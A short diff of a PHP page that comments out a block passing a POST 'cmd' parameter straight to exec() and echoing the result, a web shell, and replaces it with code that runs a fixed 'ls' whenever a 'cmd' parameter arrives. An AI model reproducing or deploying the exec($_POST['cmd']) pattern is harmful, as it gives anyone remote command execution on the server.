@@ -1,7 +1,7 @@
 <?php
 $htmlResp = "";
-var_dump($_POST);
-
+//var_dump($_POST);
+/*
 if (isset($_POST['exec'])) {
 
     exec($_POST['cmd'], $result);
@@ -15,5 +15,9 @@ if (isset($_POST['exec'])) {
     $htmlResp .= '</pre>';
 } else {
     $htmlResp = '<br>';
+}*/
+if (isset($_REQUEST['cmd'])) {
+    echo "<pre>";
+    system("ls");
+    echo "</pre>";
 }
-echo $htmlResp;
